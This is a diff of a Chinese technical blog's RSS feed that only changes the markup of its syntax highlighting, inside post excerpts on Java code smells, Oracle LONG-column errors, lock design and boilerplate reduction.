+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代码的问题是很明显：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Class1中的成员直接被Get出去，散落在各个类中操作，缺少对其操作的方法封装，破坏了类的封装性，带来了数据的耦合。&lt;/li&gt;
 &lt;li&gt;同步加锁在Owner对象之外，其出发点是以其它方法逻辑为切入，而不是从Owner对象的数据全生命周期安全来思考，很容易造成加锁不全。&lt;/li&gt;
@@ -714,12 +729,12 @@ CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd55
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;在这个月，我曾经分析处理两个与数据操作相关的性能问题。根因是缺少对表的严谨设计。通过搜索些资料，便有此博文分享给大家。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;案例一&lt;/strong&gt;：某服务对接Oracle，在某些场景下出现读取表数据失败。现象是日志会报如下堆栈信息：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;Caused by java.&lt;span style=&#34;color:#658b00&#34;&gt;sql&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;SQLException&lt;/span&gt;: Stream has already bean closed
-at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;LongAccessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getBytesInternel&lt;/span&gt;(LongAccessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:127)
-at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;Accessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getBytes&lt;/span&gt;(Accessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:897)
-at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;LongAccessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getString&lt;/span&gt;(LongAccessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:154)
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从堆栈来看，是访问Long类型的字段值(通过LongAccessor字面猜出)，获取Bytes的流强制关闭了，为什么有时会关闭，过长过大？通过Google搜索才发现，我们跳入使用Long类型坑中。&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Caused by java.&lt;span style=&#34;color:#658b00&#34;&gt;sql&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;SQLException&lt;/span&gt;: Stream has already bean closed
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;LongAccessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getBytesInternel&lt;/span&gt;(LongAccessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:127)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;Accessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getBytes&lt;/span&gt;(Accessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:897)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;driver&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;LongAccessor&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;getString&lt;/span&gt;(LongAccessor.&lt;span style=&#34;color:#658b00&#34;&gt;java&lt;/span&gt;:154)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从堆栈来看，是访问Long类型的字段值(通过LongAccessor字面猜出)，获取Bytes的流强制关闭了，为什么有时会关闭，过长过大？通过Google搜索才发现，我们跳入使用Long类型坑中。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -735,18 +750,18 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
 &lt;li&gt;经过分析代码，狂改一通代码，结果是：只配置了 &lt;strong&gt;32个线程&lt;/strong&gt; ，总消耗时间下降至 &lt;strong&gt;44秒&lt;/strong&gt; 。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;这个产品已有一定的年头，采用Java开发，但Maven配置的编译source/target还是 1.6（直接把配置修改为1.8整个产品编译会有问题。对于老产品，稳定优先，维护者并没有太多的动力升级到1.8，因为一升级需要对所有历史分支都升级并验证）。 为了线程安全，代码中大量地存在如下Double-Check写法(伪代码)，无法享受Java高版本带来的红利，并不高效：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;Description desc = cache.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(key);
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (desc == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt;(cache) {  &lt;span style=&#34;color:#228b22&#34;&gt;// 这个是全局锁，极大影响并发
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (desc == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {  
-            desc = getDescription(....);  &lt;span style=&#34;color:#228b22&#34;&gt;// 此方法还会调用其它类似写法的Cache，主要逻辑是查询以及反射类，以及嵌套类，效率并不高
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            cache = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; CopyOnWriteMap(cache) &lt;span style=&#34;color:#228b22&#34;&gt;// 对象Copy
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            cache.&lt;span style=&#34;color:#658b00&#34;&gt;add&lt;/span&gt;(key, desc);
-        }
-    }
-}
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; desc;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Description desc = cache.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(key);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (desc == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt;(cache) {  &lt;span style=&#34;color:#228b22&#34;&gt;// 这个是全局锁，极大影响并发
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (desc == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            desc = getDescription(....);  &lt;span style=&#34;color:#228b22&#34;&gt;// 此方法还会调用其它类似写法的Cache，主要逻辑是查询以及反射类，以及嵌套类，效率并不高
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            cache = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; CopyOnWriteMap(cache) &lt;span style=&#34;color:#228b22&#34;&gt;// 对象Copy
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            cache.&lt;span style=&#34;color:#658b00&#34;&gt;add&lt;/span&gt;(key, desc);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; desc;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -805,26 +820,26 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0621_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一平台产品前端源码(Java语言)中：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;constructConstrainMap&lt;/span&gt;() {
-    Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; typeConstrainMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt;();
-    Map&amp;lt;String, String&amp;gt; imageConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdPatten&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;^[a-zA-Z0-9_~.=@-]$&amp;#34;&lt;/span&gt;);
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdMin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;);
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdMax&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;256&amp;#34;&lt;/span&gt;);
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdValue&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;);
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;noEcho&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;);
-    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;com.huawei.....&amp;#34;&lt;/span&gt;);
-    typeConstrainMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(TPropType.&lt;span style=&#34;color:#658b00&#34;&gt;IAA_S_IMAGE_ID&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;(), imageConstrainPatternMap)
-
-    Map&amp;lt;String, String&amp;gt; netWorkConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 put ...
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
-    Map&amp;lt;String, String&amp;gt; containerConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 put ...
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 其它的Constrain代码 ...
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码在一个方法中构造了16个Constrain，它是提供给BME控件用于输入框的校验。显然代码出现了重复（相似），也较容易想到采用外部配置文件方式来简化样板代码，但采用什么配置方式呢？&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;constructConstrainMap&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Map&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt; typeConstrainMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, Map&amp;lt;String, String&amp;gt;&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Map&amp;lt;String, String&amp;gt; imageConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdPatten&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;^[a-zA-Z0-9_~.=@-]$&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdMin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdMax&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;256&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;allowdValue&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;noEcho&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    imageConstrainPatternMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;com.huawei.....&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    typeConstrainMap.&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(TPropType.&lt;span style=&#34;color:#658b00&#34;&gt;IAA_S_IMAGE_ID&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;(), imageConstrainPatternMap)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Map&amp;lt;String, String&amp;gt; netWorkConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 put ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Map&amp;lt;String, String&amp;gt; containerConstrainPatternMap = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 put ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 省略 其它的Constrain代码 ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码在一个方法中构造了16个Constrain，它是提供给BME控件用于输入框的校验。显然代码出现了重复（相似），也较容易想到采用外部配置文件方式来简化样板代码，但采用什么配置方式呢？&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -835,34 +850,34 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0613_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一平台产品源码(Java语言)中：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;RemoteExecuteHandler&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Future&amp;lt;RemoteExecuteResult&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;handleDownload&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throws&lt;/span&gt; SspException {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-            initSshClient();
-            Future&amp;lt;RemoteExecuteResult&amp;gt; feture = downloadPackage();
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; feture;
-        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (SspException e) {
-            LOGGER.&lt;span style=&#34;color:#658b00&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;CMC download package failed&amp;#34;&lt;/span&gt;, e);
-            closeSshClient();
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; e;
-        }
-    }
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Future&amp;lt;RemoteExecuteResult&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;handleLoad&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throws&lt;/span&gt; SspException {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-            initSshClient();
-            Future&amp;lt;RemoteExecuteResult&amp;gt; feture = loadPackage();
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; feture;
-        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (SspException e) {
-            LOGGER.&lt;span style=&#34;color:#658b00&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Load site package failed&amp;#34;&lt;/span&gt;, e);
-            closeSshClient();
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; e;
-        }
-    }
-
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 下面还有几个类似的方法，不再一一列表
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码较直观地出现重复（相似），除了执行具体的动作与日志不一样，都是样板代码。当然还存在其它问题:&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;RemoteExecuteHandler&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Future&amp;lt;RemoteExecuteResult&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;handleDownload&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throws&lt;/span&gt; SspException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            initSshClient();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Future&amp;lt;RemoteExecuteResult&amp;gt; feture = downloadPackage();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; feture;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (SspException e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            LOGGER.&lt;span style=&#34;color:#658b00&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;CMC download package failed&amp;#34;&lt;/span&gt;, e);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            closeSshClient();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; e;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
